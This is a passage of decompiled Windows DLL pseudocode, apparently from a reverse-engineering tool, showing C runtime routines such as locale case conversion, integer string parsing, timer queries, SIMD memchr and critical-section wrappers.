    "__int64 __fastcall sub_18001054C(__int64 a1, int *a2, __int64 a3)",
    "{",
    "  __int64 v3; // rbx",
    "  const WCHAR *v5; // rsi",
    "  int CodePage; // ebp",
    "  __int64 result; // rax",
    "  _QWORD *v8; // rdx",
    "  __int64 v9; // rcx",
    "  unsigned int v10; // edx",
    "  int v11; // edi",
    "  int v12; // eax",
    "  bool v13; // zf",
    "  CHAR MultiByteStr; // [rsp+68h] [rbp+10h] BYREF",
    "  char v15; // [rsp+69h] [rbp+11h]",
    "  char v16; // [rsp+6Ah] [rbp+12h]",
    "  unsigned __int8 DestStr; // [rsp+70h] [rbp+18h] BYREF",
    "  unsigned __int8 DestStr_1; // [rsp+71h] [rbp+19h]",
    "",
    "  v3 = (int)a1;",
    "  if ( a2 )",
    "  {",
    "    v5 = (const WCHAR *)*((_QWORD *)a2 + 3);",
    "    CodePage = *a2;",
    "  }",
    "  else",
    "  {",
    "    v5 = *(const WCHAR **)(sub_180021028(a1, 0, a3) + 16);",
    "    CodePage = sub_180020FF8();",
    "  }",
    "  if ( !v5 )",
    "  {",
    "    if ( (unsigned int)(v3 - 65) <= 0x19 )",
    "      LODWORD(v3) = v3 + 32;",
    "    return (unsigned int)v3;",
    "  }",
    "  if ( (unsigned int)v3 < 0x100 )",
    "  {",
    "    if ( !a2 )",
    "    {",
    "      if ( (unsigned int)sub_180020F50((unsigned int)v3) )",
    "        goto LABEL_17;",
    "      return (unsigned int)v3;",
    "    }",
    "    v8 = a2 + 2;",
    "    BYTE1(v9) = BYTE1(v3);",
    "    if ( (*(_BYTE *)(*((_QWORD *)a2 + 1) + 2 * v3) & 1) == 0 )",
    "      return (unsigned int)v3;",
    "LABEL_13:",
    "    v10 = ((unsigned int)*(__int16 *)(*v8 + 2LL * BYTE1(v9)) >> 15) & 1;",
    "    v11 = (int)v3 >> 8;",
    "    goto LABEL_14;",
    "  }",
    "  v8 = a2 + 2;",
    "  v9 = v3;",
    "  if ( a2 )",
    "    goto LABEL_13;",
    "LABEL_17:",
    "  v11 = (int)v3 >> 8;",
    "  v10 = *(_WORD *)(sub_180020DB4(v9, v8) + 2LL * BYTE1(v3)) & 0x8000;",
    "LABEL_14:",
    "  if ( v10 )",
    "  {",
    "    MultiByteStr = v11;",
    "    v15 = v3;",
    "    v16 = 0;",
    "  }",
    "  else",
    "  {",
    "    MultiByteStr = v3;",
    "    v15 = 0;",
    "  }",
    "  v12 = sub_180011344(v5, 0x100u, &MultiByteStr, (__int64)&DestStr, 3, CodePage, 1);",
    "  if ( !v12 )",
    "    return (unsigned int)v3;",
    "  v13 = v12 == 1;",
    "  result = DestStr;",
    "  if ( !v13 )",
    "    return DestStr_1 | (DestStr << 8);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180010680(__int64 a1)",
    "{",
    "  __int64 v2; // rdx",
    "  __int64 v3; // rcx",
    "  __int64 v4; // r8",
    "  __int64 v5; // rdx",
    "  __int64 v6; // rcx",
    "  __int16 *v7; // r9",
    "  int v8; // r8d",
    "  unsigned __int64 v9; // r10",
    "",
    "  *(_OWORD *)a1 = 0;",
    "  *(_OWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 32) = 0;",
    "  *(_DWORD *)(a1 + 40) = 0;",
    "  *(_DWORD *)a1 = sub_180020FF8();",
    "  *(_DWORD *)(a1 + 4) = sub_18002105C();",
    "  v6 = *(_QWORD *)(sub_180021028(v3, v2, v4) + 16);",
    "  *(_DWORD *)(a1 + 8) = v6 == 0;",
    "  if ( v6 )",
    "  {",
    "    v7 = (__int16 *)sub_180020DB4(v6, v5);",
    "    v8 = 0;",
    "    v9 = 0;",
    "    do",
    "    {",
    "      if ( *v7 < 0 )",
    "        *(_BYTE *)((v9 >> 3) + a1 + 12) |= 1 << (v8 & 7);",
    "      ++v8;",
    "      ++v9;",
    "      ++v7;",
    "    }",
    "    while ( v8 < 256 );",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180010718(__int64 a1, int *a2, __int64 a3)",
    "{",
    "  __int64 v3; // rbx",
    "  const WCHAR *v5; // rsi",
    "  int CodePage; // r14d",
    "  __int64 result; // rax",
    "  _QWORD *v8; // rdx",
    "  __int64 v9; // rcx",
    "  unsigned int v10; // edx",
    "  int v11; // edi",
    "  int v12; // eax",
    "  bool v13; // zf",
    "  CHAR MultiByteStr; // [rsp+68h] [rbp+10h] BYREF",
    "  char v15; // [rsp+69h] [rbp+11h]",
    "  char v16; // [rsp+6Ah] [rbp+12h]",
    "  unsigned __int8 DestStr; // [rsp+70h] [rbp+18h] BYREF",
    "  unsigned __int8 DestStr_1; // [rsp+71h] [rbp+19h]",
    "",
    "  v3 = (int)a1;",
    "  if ( a2 )",
    "  {",
    "    v5 = (const WCHAR *)*((_QWORD *)a2 + 3);",
    "    CodePage = *a2;",
    "  }",
    "  else",
    "  {",
    "    v5 = *(const WCHAR **)(sub_180021028(a1, 0, a3) + 16);",
    "    CodePage = sub_180020FF8();",
    "  }",
    "  if ( !v5 )",
    "  {",
    "    if ( (unsigned int)(v3 - 97) <= 0x19 )",
    "      LODWORD(v3) = v3 - 32;",
    "    return (unsigned int)v3;",
    "  }",
    "  if ( (unsigned int)v3 < 0x100 )",
    "  {",
    "    if ( !a2 )",
    "    {",
    "      if ( (unsigned int)sub_180020DF0((unsigned int)v3) )",
    "        goto LABEL_17;",
    "      return (unsigned int)v3;",
    "    }",
    "    v8 = a2 + 2;",
    "    BYTE1(v9) = BYTE1(v3);",
    "    if ( (*(_BYTE *)(*((_QWORD *)a2 + 1) + 2 * v3) & 2) == 0 )",
    "      return (unsigned int)v3;",
    "LABEL_13:",
    "    v10 = ((unsigned int)*(__int16 *)(*v8 + 2LL * BYTE1(v9)) >> 15) & 1;",
    "    v11 = (int)v3 >> 8;",
    "    goto LABEL_14;",
    "  }",
    "  v8 = a2 + 2;",
    "  v9 = v3;",
    "  if ( a2 )",
    "    goto LABEL_13;",
    "LABEL_17:",
    "  v11 = (int)v3 >> 8;",
    "  v10 = *(_WORD *)(sub_180020DB4(v9, v8) + 2LL * BYTE1(v3)) & 0x8000;",
    "LABEL_14:",
    "  if ( v10 )",
    "  {",
    "    MultiByteStr = v11;",
    "    v15 = v3;",
    "    v16 = 0;",
    "  }",
    "  else",
    "  {",
    "    MultiByteStr = v3;",
    "    v15 = 0;",
    "  }",
    "  v12 = sub_180011344(v5, 0x200u, &MultiByteStr, (__int64)&DestStr, 3, CodePage, 1);",
    "  if ( !v12 )",
    "    return (unsigned int)v3;",
    "  v13 = v12 == 1;",
    "  result = DestStr;",
    "  if ( !v13 )",
    "    return DestStr_1 | (DestStr << 8);",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_18001085C(__int64 a1)",
    "{",
    "  unsigned __int64 i; // rax",
    "  __int64 v3; // rdx",
    "  unsigned __int64 v4; // rcx",
    "  int v5; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  sub_18000FC70(&v5, 2);",
    "  *(_QWORD *)(a1 + 8) = 1;",
    "  for ( i = 1; i < 8; v4 = i )",
    "  {",
    "    v3 = qword_18004C720[i];",
    "    v4 = i;",
    "    if ( !v3 )",
    "      break;",
    "    if ( v3 == a1 )",
    "      break;",
    "    *(_QWORD *)(a1 + 8) = ++i;",
    "  }",
    "  ++byte_18004C770[v4];",
    "  qword_18004C720[v4] = a1;",
    "  sub_18000FCE8(&v5);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800108D0(__int64 a1)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v3; // rbx",
    "  __int64 v4; // rcx",
    "  void (__fastcall ***v5)(_QWORD, __int64); // rax",
    "",
    "  result = *(_QWORD *)(a1 + 8);",
    "  if ( !result || (--byte_18004C770[result], (char)byte_18004C770[result] <= 0) )",
    "  {",
    "    result = sub_180010948(a1);",
    "    v3 = *(_QWORD *)(a1 + 64);",
    "    if ( v3 )",
    "    {",
    "      v4 = *(_QWORD *)(v3 + 8);",
    "      if ( v4 )",
    "      {",
    "        v5 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 16LL))(v4);",
    "        if ( v5 )",
    "          (**v5)(v5, 1);",
    "      }",
    "      return sub_1800116E0(v3, 16);",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180010948(__int64 a1)",
    "{",
    "  __int64 **i; // rbx",
    "  __int64 result; // rax",
    "  _QWORD *v4; // rcx",
    "  _QWORD *v5; // rbx",
    "  _QWORD *v6; // rcx",
    "  _QWORD *v7; // rbx",
    "",
    "  for ( i = *(__int64 ***)(a1 + 56); i; i = (__int64 **)*i )",
    "    result = ((__int64 (__fastcall *)(_QWORD, __int64, _QWORD))i[2])(0, a1, *((unsigned int *)i + 2));",
    "  v4 = *(_QWORD **)(a1 + 48);",
    "  if ( v4 )",
    "  {",
    "    do",
    "    {",
    "      v5 = (_QWORD *)*v4;",
    "      result = sub_1800116E0(v4, 24);",
    "      v4 = v5;",
    "    }",
    "    while ( v5 );",
    "  }",
    "  *(_QWORD *)(a1 + 48) = 0;",
    "  v6 = *(_QWORD **)(a1 + 56);",
    "  if ( v6 )",
    "  {",
    "    do",
    "    {",
    "      v7 = (_QWORD *)*v6;",
    "      result = sub_1800116E0(v6, 24);",
    "      v6 = v7;",
    "    }",
    "    while ( v7 );",
    "  }",
    "  *(_QWORD *)(a1 + 56) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "LARGE_INTEGER sub_1800109C8()",
    "{",
    "  LARGE_INTEGER PerformanceCount; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  QueryPerformanceCounter(&PerformanceCount);",
    "  return PerformanceCount;",
    "}",
    "",
    "",
    "LARGE_INTEGER sub_1800109E4()",
    "{",
    "  LARGE_INTEGER result; // rax",
    "  LARGE_INTEGER Frequency; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  result.QuadPart = qword_18004C780;",
    "  if ( !qword_18004C780 )",
    "  {",
    "    QueryPerformanceFrequency(&Frequency);",
    "    result = Frequency;",
    "    qword_18004C780 = Frequency.QuadPart;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180010A10(__int64 a1, __int64 a2, char a3, int a4)",
    "{",
    "  if ( a4 )",
    "  {",
    "    *(_QWORD *)a1 = &unk_180044A64;",
    "    *(_QWORD *)(a1 + 24) = 0;",
    "    *(_QWORD *)(a1 + 32) = 0;",
    "    *(_DWORD *)(a1 + 40) = 0;",
    "    *(_QWORD *)(a1 + 48) = 0;",
    "    *(_QWORD *)(a1 + 56) = 0;",
    "    *(_QWORD *)(a1 + 64) = 0;",
    "    *(_QWORD *)(a1 + 72) = 0;",
    "    *(_QWORD *)(a1 + 80) = 0;",
    "    *(_QWORD *)(a1 + 16) = &off_18003A530;",
    "    *(_QWORD *)(a1 + 88) = 0;",
    "    *(_QWORD *)(a1 + 96) = 0;",
    "    *(_BYTE *)(a1 + 104) = 0;",
    "  }",
    "  *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1) = &off_18003A540;",
    "  *(_DWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 - 4) = *(_DWORD *)(*(_QWORD *)a1 + 4LL) - 16;",
    "  sub_1800095C0(a1 + *(int *)(*(_QWORD *)a1 + 4LL), a2, a3);",
    "  return a1;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "__int64 __fastcall sub_180010AB0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "}__int64 __fastcall sub_180010AB8(__int64 a1, int a2)",
    "{",
    "  int v2; // r9d",
    "  __int64 v3; // rbx",
    "  bool v4; // si",
    "  int v6; // ecx",
    "  int v7; // edx",
    "  unsigned int v8; // edx",
    "  __int64 *v9; // rax",
    "  __int64 v10; // rax",
    "  __int64 v11; // rdi",
    "",
    "  v2 = a2 | 1;",
    "  v3 = 0;",
    "  v4 = (a2 & 4) != 0;",
    "  v6 = 0;",
    "  if ( (a2 & 0x40) == 0 )",
    "    v2 = a2;",
    "  v7 = v2 | 2;",
    "  if ( (v2 & 8) == 0 )",
    "    v7 = v2;",
    "  v8 = v7 & 0xFFFFFFBB;",
    "  if ( dword_18004B010 == v8 )",
    "  {",
    "LABEL_9:",
    "    v10 = sub_180021830(a1, *(&off_18003A6A0 + v6));",
    "    v11 = v10;",
    "    if ( v10 )",
    "    {",
    "      if ( v4 && (unsigned int)sub_18001FB50(v10, 0, 2) )",
    "        sub_180020498(v11);",
    "      else",
    "        return v11;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v9 = (__int64 *)&dword_18004B010;",
    "    while ( 1 )",
    "    {",
    "      ++v6;",
    "      v9 = (__int64 *)((char *)v9 + 4);",
    "      if ( v9 == &qword_18004B060 )",
    "        break;",
    "      if ( *(_DWORD *)v9 == v8 )",
    "        goto LABEL_9;",
    "    }",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "unsigned __int64 __fastcall sub_180010B70(char *a1, char **a2, unsigned int a3, _DWORD *a4)",
    "{",
    "  unsigned __int64 v4; // rdi",
    "  char **v6; // rsi",
    "  char *v7; // r14",
    "  __int64 v8; // rcx",
    "  char *v9; // rbx",
    "  char v10; // r12",
    "  char *v11; // r13",
    "  unsigned __int64 v12; // rbp",
    "  unsigned int v13; // eax",
    "  __int64 v14; // rax",
    "  unsigned __int64 v15; // rdx",
    "  unsigned int v16; // eax",
    "  unsigned __int64 result; // rax",
    "  __int64 v18; // rcx",
    "  char *v19; // [rsp+20h] [rbp-58h]",
    "  char v22; // [rsp+90h] [rbp+18h]",
    "  unsigned __int64 v23; // [rsp+98h] [rbp+20h]",
    "",
    "  v4 = a3;",
    "  v6 = a2;",
    "  v7 = a1;",
    "  if ( a4 )",
    "    *a4 = 0;",
    "  v8 = (unsigned __int8)*a1;",
    "  v9 = v7;",
    "  while ( (unsigned int)sub_180020EA0(v8) )",
    "    v8 = (unsigned __int8)*++v9;",
    "  v10 = *v9;",
    "  if ( ((*v9 - 43) & 0xFD) != 0 )",
    "    v10 = 43;",
    "  else",
    "    ++v9;",
    "  if ( (_DWORD)v4 )",
    "  {",
    "    if ( (unsigned int)(v4 - 2) > 0x22 )",
    "    {",
    "LABEL_28:",
    "      if ( v6 )",
    "        *v6 = v7;",
    "      return 0;",
    "    }",
    "    if ( (int)v4 > 0 )",
    "    {",
    "      if ( (_DWORD)v4 != 16 || *v9 != 48 || ((v9[1] - 88) & 0xDF) != 0 )",
    "      {",
    "LABEL_22:",
    "        v11 = v9;",
    "        if ( *v9 != 48 )",
    "          goto LABEL_24;",
    "        goto LABEL_23;",
    "      }",
    "LABEL_21:",
    "      v9 += 2;",
    "      goto LABEL_22;",
    "    }",
    "  }",
    "  if ( *v9 != 48 )",
    "  {",
    "    v4 = 10;",
    "    v11 = v9;",
    "    goto LABEL_24;",
    "  }",
    "  if ( ((v9[1] - 88) & 0xDF) == 0 )",
    "  {",
    "    v4 = 16;",
    "    goto LABEL_21;",
    "  }",
    "  v4 = 8;",
    "  v11 = v9;",
    "  do",
    "LABEL_23:",
    "    ++v9;",
    "  while ( *v9 == 48 );",
    "LABEL_24:",
    "  v12 = 0;",
    "  v23 = 0;",
    "  v22 = 0;",
    "  v19 = v9;",
    "  v13 = sub_18002196C((unsigned int)*v9);",
    "  v14 = sub_1800367E0(\"0123456789abcdefghijklmnopqrstuvwxyz\", v13, v4);",
    "  if ( v14 )",
    "  {",
    "    do",
    "    {",
    "      v23 = v12;",
    "      ++v9;",
    "      v12 = v12 * v4 + (char)(v14 - (unsigned __int8)\"0123456789abcdefghijklmnopqrstuvwxyz\");",
    "      v22 = v14 - (unsigned __int8)\"0123456789abcdefghijklmnopqrstuvwxyz\";",
    "      v16 = sub_18002196C((unsigned int)*v9);",
    "      v14 = sub_1800367E0(\"0123456789abcdefghijklmnopqrstuvwxyz\", v16, v4);",
    "    }",
    "    while ( v14 );",
    "    v6 = a2;",
    "    v7 = a1;",
    "  }",
    "  if ( v11 == v9 )",
    "    goto LABEL_28;",
    "  v18 = &v9[-byte_18003A7B8[v4]] - v19;",
    "  if ( v18 >= 0 )",
    "  {",
    "    if ( v18 > 0 || (v18 = v22, v12 < v22) || (v15 = (v12 - v22) % v4, (v12 - v22) / v4 != v23) )",
    "    {",
    "      *(_DWORD *)sub_18001A80C(v18, v15) = 34;",
    "      if ( a4 )",
    "        *a4 = 1;",
    "      v12 = -1;",
    "      v10 = 43;",
    "    }",
    "  }",
    "  result = -(__int64)v12;",
    "  if ( v10 != 45 )",
    "    result = v12;",
    "  if ( v6 )",
    "    *v6 = v9;",
    "  return result;",
    "}",
    "",
    "",
    "unsigned __int64 __fastcall sub_180010D54(char *a1, char **a2, unsigned int a3, _DWORD *a4)",
    "{",
    "  char **v4; // r14",
    "  char *v6; // rdi",
    "  __int64 v7; // rcx",
    "  char v10; // bl",
    "  unsigned __int64 v11; // rax",
    "  __int64 v12; // rdx",
    "  unsigned __int64 v13; // rcx",
    "  __int64 v15; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  v4 = (char **)&v15;",
    "  v6 = a1;",
    "  v7 = (unsigned __int8)*a1;",
    "  if ( a2 )",
    "    v4 = a2;",
    "  while ( (unsigned int)sub_180020EA0(v7) )",
    "    v7 = (unsigned __int8)*++v6;",
    "  v10 = *v6;",
    "  if ( ((*v6 - 43) & 0xFD) != 0 )",
    "    v10 = 43;",
    "  else",
    "    ++v6;",
    "  v11 = sub_180010B70(v6, v4, a3, a4);",
    "  v13 = v11;",
    "  if ( v6 == *v4 )",
    "  {",
    "    *v4 = a1;",
    "  }",
    "  else if ( a1 != *v4 )",
    "  {",
    "    goto LABEL_13;",
    "  }",
    "  if ( v11 )",
    "  {",
    "LABEL_17:",
    "    *(_DWORD *)sub_18001A80C(v11, v12) = 34;",
    "    if ( a4 )",
    "      *a4 = 1;",
    "    return 0x8000000000000000uLL - (v10 != 45);",
    "  }",
    "LABEL_13:",
    "  if ( v10 == 43 && v11 > 0x7FFFFFFFFFFFFFFFLL || v10 == 45 && v11 > 0x8000000000000000uLL )",
    "    goto LABEL_17;",
    "  if ( v10 == 45 )",
    "    return -(__int64)v11;",
    "  return v13;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180010E54(char *a1, char **a2, unsigned int a3, _DWORD *a4)",
    "{",
    "  _DWORD *v4; // r15",
    "  char **v6; // rsi",
    "  char *v7; // r14",
    "  __int64 v8; // rcx",
    "  char *v9; // rbx",
    "  char v10; // r12",
    "  char *v11; // r13",
    "  unsigned int v12; // ebp",
    "  unsigned int v13; // eax",
    "  __int64 v14; // rax",
    "  __int64 v15; // rdx",
    "  unsigned int v16; // eax",
    "  __int64 result; // rax",
    "  __int64 v18; // rcx",
    "  unsigned int v19; // eax",
    "  unsigned int v20; // [rsp+20h] [rbp-58h]",
    "  char *v21; // [rsp+28h] [rbp-50h]",
    "  char v24; // [rsp+90h] [rbp+18h]",
    "",
    "  v24 = 0;",
    "  v4 = a4;",
    "  v6 = a2;",
    "  v7 = a1;",
    "  if ( a4 )",
    "    *a4 = 0;",
    "  v8 = (unsigned __int8)*a1;",
    "  v9 = v7;",
    "  while ( (unsigned int)sub_180020EA0(v8) )",
    "    v8 = (unsigned __int8)*++v9;",
    "  v10 = *v9;",
    "  if ( ((*v9 - 43) & 0xFD) != 0 )",
    "    v10 = 43;",
    "  else",
    "    ++v9;",
    "  if ( a3 )",
    "  {",
    "    if ( a3 - 2 > 0x22 )",
    "    {",
    "LABEL_28:",
    "      if ( v6 )",
    "        *v6 = v7;",
    "      return 0;",
    "    }",
    "    if ( (int)a3 > 0 )",
    "    {",
    "      if ( a3 != 16 || *v9 != 48 || ((v9[1] - 88) & 0xDF) != 0 )",
    "      {",
    "LABEL_22:",
    "        v11 = v9;",
    "        if ( *v9 != 48 )",
    "          goto LABEL_24;",
    "        goto LABEL_23;",
    "      }",
    "LABEL_21:",
    "      v9 += 2;",
    "      goto LABEL_22;",
    "    }",
    "  }",
    "  if ( *v9 != 48 )",
    "  {",
    "    a3 = 10;",
    "    v11 = v9;",
    "    goto LABEL_24;",
    "  }",
    "  if ( ((v9[1] - 88) & 0xDF) == 0 )",
    "  {",
    "    a3 = 16;",
    "    goto LABEL_21;",
    "  }",
    "  a3 = 8;",
    "  v11 = v9;",
    "  do",
    "LABEL_23:",
    "    ++v9;",
    "  while ( *v9 == 48 );",
    "LABEL_24:",
    "  v12 = 0;",
    "  v20 = 0;",
    "  v21 = v9;",
    "  v13 = sub_18002196C((unsigned int)*v9);",
    "  v14 = sub_1800367E0(\"0123456789abcdefghijklmnopqrstuvwxyz\", v13, a3);",
    "  if ( v14 )",
    "  {",
    "    do",
    "    {",
    "      v20 = v12;",
    "      ++v9;",
    "      v24 = v14 - (unsigned __int8)\"0123456789abcdefghijklmnopqrstuvwxyz\";",
    "      v12 = v24 + a3 * v12;",
    "      v16 = sub_18002196C((unsigned int)*v9);",
    "      v14 = sub_1800367E0(\"0123456789abcdefghijklmnopqrstuvwxyz\", v16, a3);",
    "    }",
    "    while ( v14 );",
    "    v6 = a2;",
    "    v7 = a1;",
    "    v4 = a4;",
    "  }",
    "  if ( v11 == v9 )",
    "    goto LABEL_28;",
    "  v18 = &v9[-byte_18003A808[a3]] - v21;",
    "  if ( v18 >= 0 )",
    "  {",
    "    if ( v18 > 0",
    "      || (v18 = (unsigned int)v24, v19 = v12 - v18, v12 < (unsigned int)v18)",
    "      || (v15 = v19 % a3, v19 / a3 != v20) )",
    "    {",
    "      *(_DWORD *)sub_18001A80C(v18, v15) = 34;",
    "      if ( v4 )",
    "        *v4 = 1;",
    "      v12 = -1;",
    "      v10 = 43;",
    "    }",
    "  }",
    "  result = -v12;",
    "  if ( v10 != 45 )",
    "    result = v12;",
    "  if ( v6 )",
    "    *v6 = v9;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180011030(char *a1, char **a2, unsigned int a3, _DWORD *a4)",
    "{",
    "  char **v4; // r14",
    "  char *v6; // rdi",
    "  __int64 v7; // rcx",
    "  char v10; // bl",
    "  unsigned int v11; // eax",
    "  __int64 v12; // rdx",
    "  unsigned int v13; // ecx",
    "  unsigned int v14; // esi",
    "  unsigned int v16; // eax",
    "  __int64 v17; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  v4 = (char **)&v17;",
    "  v6 = a1;",
    "  v7 = (unsigned __int8)*a1;",
    "  if ( a2 )",
    "    v4 = a2;",
    "  while ( (unsigned int)sub_180020EA0(v7) )",
    "    v7 = (unsigned __int8)*++v6;",
    "  v10 = *v6;",
    "  if ( ((*v6 - 43) & 0xFD) != 0 )",
    "    v10 = 43;",
    "  else",
    "    ++v6;",
    "  v11 = sub_180010E54(v6, v4, a3, a4);",
    "  v13 = v11;",
    "  v14 = 0x7FFFFFFF;",
    "  if ( v6 == *v4 )",
    "  {",
    "    *v4 = a1;",
    "  }",
    "  else if ( a1 != *v4 )",
    "  {",
    "    goto LABEL_13;",
    "  }",
    "  if ( v11 )",
    "  {",
    "LABEL_17:",
    "    *(_DWORD *)sub_18001A80C(v11, v12) = 34;",
    "    if ( a4 )",
    "      *a4 = 1;",
    "    if ( v10 == 45 )",
    "      return 0x80000000;",
    "    return v14;",
    "  }",
    "LABEL_13:",
    "  if ( v10 == 43 && v11 > 0x7FFFFFFF || v10 == 45 && v11 > 0x80000000 )",
    "    goto LABEL_17;",
    "  v16 = -v11;",
    "  if ( v10 == 45 )",
    "    return v16;",
    "  return v13;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "void __stdcall Sleep(DWORD dwMilliseconds)",
    "{",
    "}const __m128i *__fastcall sub_180011120(const __m128i *a1, const __m128i *a2, char a3)",
    "{",
    "  signed __int64 v5; // r9",
    "  const __m128i *v7; // r10",
    "  unsigned __int64 v14; // r9",
    "  const __m128i *v15; // r10",
    "  __m128i v16; // xmm1",
    "  __m128i v17; // xmm1",
    "  __m128i v18; // xmm1",
    "  __int64 v19; // rax",
    "",
    "  v5 = (char *)a2 - (char *)a1;",
    "  if ( (((char *)a2 - (char *)a1) & 0xFFFFFFFFFFFFFFE0uLL) != 0 && (dword_18004B0D4 & 0x20) != 0 )",
    "  {",
    "    _EAX = a3;",
    "    v7 = (const __m128i *)((char *)a1 + (((char *)a2 - (char *)a1) & 0xFFFFFFFFFFFFFFE0uLL));",
    "    __asm",
    "    {",
    "      vmovd   xmm2, eax",
    "      vpxor   xmm0, xmm0, xmm0",
    "      vpshufb xmm2, xmm2, xmm0",
    "      vinsertf128 ymm2, ymm2, xmm2, 1",
    "    }",
    "    while ( 1 )",
    "    {",
    "      __asm",
    "      {",
    "        vpcmpeqb ymm1, ymm2, ymmword ptr [rcx]",
    "        vpmovmskb eax, ymm1",
    "      }",
    "      if ( _EAX )",
    "        break;",
    "      a1 += 2;",
    "      if ( a1 == v7 )",
    "      {",
    "        v5 &= 0x1Fu;",
    "        __asm { vzeroupper }",
    "        goto LABEL_7;",
    "      }",
    "    }",
    "    __asm",
    "    {",
    "      vzeroupper",
    "      tzcnt   eax, eax",
    "    }",
    "    return (const __m128i *)((char *)a1 + _EAX);",
    "  }",
    "  else",
    "  {",
    "LABEL_7:",
    "    v14 = v5 & 0xFFFFFFFFFFFFFFF0uLL;",
    "    if ( v14 )",
    "    {",
    "      v15 = (const __m128i *)((char *)a1 + v14);",
    "      v16 = _mm_cvtsi32_si128(a3);",
    "      v17 = _mm_unpacklo_epi8(v16, v16);",
    "      v18 = _mm_shuffle_epi32(_mm_unpacklo_epi16(v17, v17), 0);",
    "      while ( 1 )",
    "      {",
    "        LODWORD(v19) = _mm_movemask_epi8(_mm_cmpeq_epi8(_mm_loadu_si128(a1), v18));",
    "        if ( (_DWORD)v19 )",
    "          break;",
    "        if ( ++a1 == v15 )",
    "          goto LABEL_11;",
    "      }",
    "      _BitScanForward((unsigned int *)&v19, v19);",
    "      return (const __m128i *)((char *)a1 + v19);",
    "    }",
    "    else",
    "    {",
    "LABEL_11:",
    "      while ( a1 != a2 )",
    "      {",
    "        if ( a1->m128i_i8[0] == a3 )",
    "          break;",
    "        a1 = (const __m128i *)((char *)a1 + 1);",
    "      }",
    "      return a1;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800111F0(__m128i *_RCX, __m128i *a2)",
    "{",
    "  unsigned __int64 v3; // rdx",
    "  __int64 result; // rax",
    "  __m128i *v6; // rdx",
    "  __m128i si128; // xmm2",
    "  __m128i *v12; // rdx",
    "  __m128i v13; // xmm1",
    "  __int8 v14; // dl",
    "",
    "  _R8 = a2;",
    "  v3 = (char *)a2 - (char *)_RCX;",
    "  if ( v3 >= 0x40 )",
    "  {",
    "    result = (unsigned int)dword_18004B0D4 >> 5;",
    "    if ( (dword_18004B0D4 & 0x20) != 0 )",
    "    {",
    "      __asm { vmovdqu ymm4, cs:ymmword_18003A860 }",
    "      result = 0x7FFFFFFFFFFFFFE0LL;",
    "      v6 = (__m128i *)((char *)_RCX + ((v3 >> 1) & 0x7FFFFFFFFFFFFFE0LL));",
    "      do",
    "      {",
    "        __asm { vpermq  ymm1, ymmword ptr [rcx], 4Eh ; 'N' }",
    "        _R8 -= 2;",
    "        __asm",
    "        {",
    "          vpshufb ymm3, ymm1, ymm4",
    "          vpermq  ymm1, ymmword ptr [r8], 4Eh ; 'N'",
    "          vpshufb ymm2, ymm1, ymm4",
    "          vmovdqu ymmword ptr [rcx], ymm2",
    "        }",
    "        _RCX += 2;",
    "        __asm { vmovdqu ymmword ptr [r8], ymm3 }",
    "      }",
    "      while ( _RCX != v6 );",
    "      __asm { vzeroupper }",
    "    }",
    "  }",
    "  if ( (unsigned __int64)((char *)_R8 - (char *)_RCX) >= 0x20 )",
    "  {",
    "    result = (unsigned int)dword_18004B0D4 >> 2;",
    "    if ( (dword_18004B0D4 & 4) != 0 )",
    "    {",
    "      si128 = _mm_load_si128((const __m128i *)&xmmword_18003A830);",
    "      result = 0x7FFFFFFFFFFFFFF0LL;",
    "      v12 = (__m128i *)((char *)_RCX + (((unsigned __int64)((char *)_R8 - (char *)_RCX) >> 1) & 0x7FFFFFFFFFFFFFF0LL));",
    "      do",
    "      {",
    "        --_R8;",
    "        v13 = _mm_shuffle_epi8(_mm_loadu_si128(_RCX), si128);",
    "        *_RCX++ = _mm_shuffle_epi8(_mm_loadu_si128(_R8), si128);",
    "        *_R8 = v13;",
    "      }",
    "      while ( _RCX != v12 );",
    "    }",
    "  }",
    "  for ( ; _RCX != _R8; _R8->m128i_i8[0] = v14 )",
    "  {",
    "    _R8 = (__m128i *)((char *)_R8 - 1);",
    "    if ( _RCX == _R8 )",
    "      break;",
    "    v14 = _RCX->m128i_i8[0];",
    "    result = _R8->m128i_u8[0];",
    "    _RCX->m128i_i8[0] = result;",
    "    _RCX = (__m128i *)((char *)_RCX + 1);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)",
    "{",
    "}BOOL __fastcall Mtxinit(struct _RTL_CRITICAL_SECTION *a1)",
    "{",
    "  return InitializeCriticalSectionEx(a1, 0xFA0u, 0);",
    "}",
    "",
    "",
    "// attributes: thunk",
    "void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)",
    "{",
    "}// attributes: thunk",
    "void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)",
    "{",
    "}PVOID __fastcall sub_180011308(void *a1)",
    "{",
    "  PVOID result; // rax",
    "",
    "  if ( !qword_18004B060 )",
    "    sub_1800219B0();",
    "  result = EncodePointer(a1);",
